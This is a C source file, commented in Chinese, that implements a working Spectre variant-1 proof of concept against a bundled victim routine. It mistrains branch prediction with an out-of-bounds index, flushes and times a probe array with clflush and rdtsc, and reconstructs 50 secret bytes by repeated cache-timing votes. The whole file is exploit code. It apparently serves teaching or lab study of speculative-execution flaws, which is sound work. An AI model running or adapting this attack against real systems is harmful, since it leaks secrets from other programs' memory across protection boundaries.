#include <stdio.h>
#include <x86intrin.h>
#include "Victim.h"

//预设的Cache Hit阈值
#define HIT_THRESHHOLD 100

//攻击者数组
unsigned char attacker_array[256*Cache_Line];
//受害者数组大小
extern unsigned char victim_array_size;
//秘密信息的地址和受害者数组的地址
unsigned long long secret_address, victim_array_address;

int main(){
    int i = 0, j = 0, k = 0;
    //攻击者索引号
    unsigned long long attacker_index[6];
    //计时开始点、计时结束点和临时变量
    unsigned long long start = 0, end = 0, temp = 0;
    //临时地址
    unsigned char* temp_addr;
    //计时差值（以时钟周期数为单位）数组
    unsigned int difference[256];
    //秘密信息字节数组和其中字节的概率性计数
    char secret[50];
    unsigned int probability_count[256];
    //最大概率的值和次大概率的值
    unsigned int first_probability = 0, second_probability = 0;
    //最大概率的字节值和次大概率的字节值
    unsigned char first_probability_char = 0, second_probability_char = 0;

    //初始化数组attacker_array、secret、probability_count和difference
    for(i = 0; i<256*Cache_Line; i++) attacker_array[i] = 0;
    for(i = 0; i<50; i++) secret[i] = 0;
    for(i = 0; i<256; i++){
        probability_count[i] = 0;
        difference[i] = 0;
    }

    //获取秘密信息的地址和受害者数组的地址
    struct Information information = get_victim_information();
    secret_address = information.Secret_Address;
    victim_array_address = information.Victim_Array_Address;

    //初始化数组attacker_index（前5个攻击者索引号都为正常索引号，最后1个攻击者索引号为越界索引号）
    for(i = 0; i<5; i++) attacker_index[i] = 0;
    attacker_index[5] = secret_address-victim_array_address;

    //打印Spectre攻击信息
    printf("******************** spectre start ********************\n");
    printf("secret_address = %p\n", (void*)secret_address);
    printf("victim_array_address = %p\n", (void*)victim_array_address);

    //对50个字节做攻击
    for(k = 0; k<50; k++){
        //对每个字节做500次攻击
        for(j = 0; j<500; j++){
            //清空攻击者数组的地址缓存，后续用于提取秘密信息的相关内容
            for(i = 0; i<256; i++) _mm_clflush((const void*)(attacker_array+i*Cache_Line));

            //执行Spectre攻击（每5次正常访问后出现1次越界访问）
            for(i = 0; i<6; i++){
                //清空受害者数组大小的地址缓存，后续用于触发分支预测机制
                _mm_clflush((const void*)(&victim_array_size));
                //隔离
                _mm_mfence();
                //调用被攻击的受害者程序段
                victim(attacker_index[i]);
                //隔离
                _mm_mfence();
            }

            //遍历用于做攻击的存储/地址空间，记录计时差值（存储访问时间）
            for(i = 0; i<256; i++){
                temp_addr = (unsigned char*)(attacker_array+i*Cache_Line);
                //隔离
                _mm_mfence(); 
                //清空流水线（20个nop指令）
                asm volatile("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
                //开始计时
                start = __rdtsc();
                //隔离
                _mm_mfence(); 
                //访存操作
                temp = *temp_addr;
                //隔离
                _mm_mfence();
                //结束计时
                end = __rdtsc();
                //隔离
                _mm_mfence();
                //计算计时差值
                difference[i] = end-start;
                // printf("Spectre Attacking ...\n\n");
            }

            //当计时差值小于HIT_THRESHHOLD时，概率性计数就增加
            for(i = 0; i<256; i++) if(difference[i]<HIT_THRESHHOLD) probability_count[i]++;

            // //打印Spectre攻击信息
            // for(i = 0; i<256; i++) printf("difference[%d]:%d\n", i, difference[i]);
            printf("Spectre Attacking ...\n\n");
        }

        //找出最大概率的字节值和次大概率的字节值
        for(i=0; i<256; i++)
            if(probability_count[i]>first_probability){
                first_probability = probability_count[i];
                first_probability_char = i;
            }
            else if(probability_count[i]>second_probability){
                second_probability = probability_count[i];
                second_probability_char = i;
            }

        // //打印Spectre攻击信息
        // printf("first_probability_char:%d\n", first_probability_char);
        // printf("second_probability_char:%d\n", second_probability_char);

        //为简单起见，默认次大概率的字节值为秘密信息
        secret[k] = second_probability_char;

        //将循环重用变量还原
        for(i=0; i<256; i++) probability_count[i] = 0;
        first_probability = 0;
        second_probability = 0;
        
        //对下个字节继续进行攻击
        attacker_index[5] += 1;        
    }

    //打印Spectre攻击信息
    printf("secret:%s\n", secret);
    printf("********************* spectre end *********************\n\n");

    return 0;
}
